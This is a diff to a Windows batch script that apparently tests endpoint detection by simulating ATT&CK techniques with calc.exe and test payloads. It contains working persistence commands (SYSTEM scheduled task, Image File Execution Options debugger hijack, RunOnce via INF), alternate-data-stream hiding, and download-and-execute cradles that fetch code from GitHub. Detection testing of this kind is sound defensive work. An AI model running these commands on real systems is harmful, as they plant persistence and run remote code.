@@ -145,6 +145,7 @@ echo Command Excuted: C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /
 start "" cmd /c C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
 echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll
+
 timeout 2
 
 echo %time% %date% [+] T1121 - Testing regasm x64
@@ -249,7 +250,7 @@ echo Command Excuted: winrm qc -q
 echo Command Excuted: winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
 timeout 2
 echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
-start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
+start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System" /f
 echo Execution Finished at %time% %date%
 echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
 timeout 2
@@ -285,13 +286,14 @@ echo Command Excuted: echo "test123 > 12.txt
 timeout 2
 echo %time% %date% [+] T1183 - Exec via File Execution Options
 
-start "" cmd /c  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
-start "" cmd /c  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
-start "" cmd /c  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "calc.exe"
+start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "C:\windows\system32\calc.exe"
+start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
+start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 
+start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "C:\windows\system32\calc.exe"
 echo Execution Finished at %time% %date%
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
-echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "calc.exe"
+echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "calc.exe"
 timeout 2
 echo %time% %date% [+] T1096 - NTFS File Attributes
 type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
@@ -339,9 +341,10 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
 timeout 2
 echo %time% %date% [+] Testing HH.exe download
-start "" cmd /c  HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
+REM HH.exe does not handle HTTPS
+start "" cmd /c  HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
 echo Execution Finished at %time% %date% 
-echo Command Excuted: HH.exe https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
+echo Command Excuted: HH.exe http://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt
 timeout 2
 echo %time% %date% Testing ieexec.exe download & execute"exec"
 start "" cmd /c  ieexec.exe https://github.com/op7ic/EDR-Testing-Script/blob/master/Payloads/notepad.msi?raw=true  
@@ -364,7 +367,7 @@ echo AddReg = CalcStart >> calc.inf
 echo [CalcStart]
 echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf
 
-start "" cmd /c  rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
+start "" cmd /c rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
 echo Execution Finished at %time% %date% 
 echo Command Excuted: rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
 timeout 2
